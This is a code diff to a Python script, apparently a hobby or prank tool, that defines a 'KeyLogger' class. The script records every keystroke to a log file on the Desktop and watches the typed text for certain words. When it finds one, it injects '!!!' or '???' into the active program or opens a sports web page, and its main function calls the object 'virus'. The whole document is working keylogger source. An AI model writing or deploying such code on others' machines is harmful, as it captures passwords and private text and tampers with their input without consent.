@@ -3,20 +3,22 @@ import logging, os, webbrowser
 
 
 class KeyLogger:
-    def __init__(self):
+    def __init__(self, fileName='\Key_log.txt'):
         self.log_dir = os.path.expanduser('~/Desktop')
 
-        logging.basicConfig(filename=(self.log_dir + '\Key_log.txt'),
+        logging.basicConfig(filename=(self.log_dir + fileName),
                             level=logging.DEBUG,
                             format='%(asctime)s: %(message)s')
 
-        self.coolList = [0, 0, 0, 0]
+        self.coolList = []
 
     def on_press(self, key):
         logging.info(key)
-        self.coolList.pop(0)
-        self.coolList.append(str(key))
-        self.check()
+        if key == Key.backspace:
+            self.coolList.pop()
+        if key != Key.caps_lock and key != Key.shift and key != Key.backspace:
+            self.coolList.append(str(key).lower())
+            self.check()
 
     def run(self):
         with Listener(on_press=self.on_press) as listener:
@@ -24,24 +26,44 @@ class KeyLogger:
 
     def check(self):
         #print(self.coolList)
+        checkList = self.coolList[-4:]
         event_cool = ["'c'", "'o'", "'o'", "'l'"]
-        if self.coolList == event_cool:
+        if checkList == event_cool:
             print('COOL!!!')
-
-        event_what = ["'w'", "'h'", "'a'", "'t'"]
-        if self.coolList == event_what:
             keyboard = Controller()
             with keyboard.pressed(Key.shift):
-                keyboard.press('/')
+                keyboard.press('1')
             with keyboard.pressed(Key.shift):
-                keyboard.press('/')
+                keyboard.press('1')
             with keyboard.pressed(Key.shift):
-                keyboard.press('/')
+                keyboard.press('1')
+            return
 
-        event_texas_is_back = ["'t'", "'e'", "'x'", "'a'"]
-        if self.coolList == event_texas_is_back:
-            #webbrowser.open('https://istexasback.com')
+        event_what = [
+            ["'w'", "'h'", "'a'", "'t'"],
+            ["'h'", "'o'", "'w'"],
+            ["'w'", "'h'", "'e'", "'n'"],
+            ["'w'", "'h'", "'e'", "'r'", "'e'"],
+            ["'w'", "'h'", "'y'"]
+            ]
+        for i in event_what:
+            length = len(i) * -1
+            checkList = self.coolList[length:]
+            if checkList == i:
+                keyboard = Controller()
+                with keyboard.pressed(Key.shift):
+                    keyboard.press('/')
+                with keyboard.pressed(Key.shift):
+                    keyboard.press('/')
+                with keyboard.pressed(Key.shift):
+                    keyboard.press('/')
+                return
+
+        checkList = self.coolList[-5:]
+        event_texas_is_back = ["'t'", "'e'", "'x'", "'a'", "'s'"]
+        if checkList == event_texas_is_back:
             webbrowser.open('www.espn.com/college-football/rankings')
+            return
 
 def main():
     virus = KeyLogger()
